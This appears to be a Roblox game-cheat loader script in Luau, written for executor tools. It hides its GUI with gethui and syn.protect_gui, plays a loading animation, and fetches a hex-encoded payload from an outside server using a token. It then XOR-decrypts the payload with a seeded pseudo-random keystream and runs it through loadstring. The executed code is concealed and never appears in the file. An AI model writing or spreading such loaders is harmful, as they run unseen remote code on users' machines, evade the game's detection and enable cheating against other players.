local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local playerGui = localPlayer:WaitForChild("PlayerGui", 5)

local function safeParent()
    if gethui then
        local s, h = pcall(gethui)
        if s and h then return h end
    end
    local s = pcall(function() return CoreGui.Name end)
    if s then return CoreGui end
    return playerGui or CoreGui
end

local parent = safeParent()
local old = parent:FindFirstChild("NMC_Pure_Loader")
if old then old:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "NMC_Pure_Loader"
gui.ResetOnSpawn = false
gui.DisplayOrder = 99999
gui.IgnoreGuiInset = true
pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
gui.Parent = parent

local warper = Instance.new("Frame")
warper.AnchorPoint = Vector2.new(0.5, 0.5)
warper.Position = UDim2.new(0.5, 0.5)
warper.Size = UDim2.new(0, 260, 0, 260)
warper.BackgroundTransparency = 1
warper.BorderSizePixel = 0
warper.ClipsDescendants = true
warper.Parent = gui

local anim = Instance.new("ImageLabel")
anim.Image = "rbxassetid://101089840881438"
anim.BackgroundTransparency = 1
anim.BorderSizePixel = 0
anim.Size = UDim2.new(11, 0, 11, 0)
anim.Parent = warper

local frame, last = 1, tick()
local conn = RunService.RenderStepped:Connect(function()
    if tick() - last >= 1 / 30 then
        frame = frame % 115 + 1
        local col = (frame - 1) % 11
        local row = math.floor((frame - 1) / 11)
        anim.Position = UDim2.new(-col, 0, -row, 0)
        last = tick()
    end
end)

local function cleanup()
    pcall(function() conn:Disconnect() end)
    pcall(function() gui:Destroy() end)
end

task.spawn(function()
    local token = "1792393656220.706c73646f6e6174652e6c7561.6e8588325d98f39a172e9cc3647ea601"
    local ok, hex = pcall(function()
        return game:HttpGet("https://nmc-pathan.vercel.app/api/stage?t=" .. token)
    end)
    if not ok or type(hex) ~= "string" or #hex < 2 or hex:sub(1, 1) == "{" then
        cleanup()
        warn("[NMC] Failed to load script.")
        return
    end

    local sig = token:match("%.(%x+)$")
    local state = tonumber(string.sub(sig, 1, 8), 16) % 2147483646 + 1
    local parts, buf, n = {}, {}, 0
    for i = 1, #hex, 2 do
        state = (state * 16807) % 2147483647
        local k = math.floor(state / 256) % 256
        n = n + 1
        buf[n] = bit32.bxor(tonumber(string.sub(hex, i, i + 1), 16), k)
        if n == 4096 then
            parts[#parts + 1] = string.char(table.unpack(buf, 1, n))
            buf, n = {}, 0
        end
        if i % 60000 == 1 then RunService.Heartbeat:Wait() end
    end
    if n > 0 then parts[#parts + 1] = string.char(table.unpack(buf, 1, n)) end

    local fn = loadstring(table.concat(parts))
    cleanup()
    if fn then
        task.defer(fn)
    else
        warn("[NMC] Script decode failed.")
    end
end)
